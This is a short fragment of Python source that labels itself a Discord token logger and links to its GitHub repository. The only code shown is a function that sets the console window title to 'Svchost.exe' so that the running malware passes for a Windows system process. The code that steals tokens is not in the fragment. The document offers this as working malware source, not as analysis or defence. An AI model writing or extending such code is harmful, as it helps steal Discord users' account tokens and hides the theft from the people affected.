# Token Logger - Deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger



# SvcHost
def svchost():
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    SetConsoleTitleW = kernel32.SetConsoleTitleW
    SetConsoleTitleW.argtypes = [ctypes.c_wchar_p]
    SetConsoleTitleW.restype = ctypes.c_bool
    SetConsoleTitleW("Svchost.exe")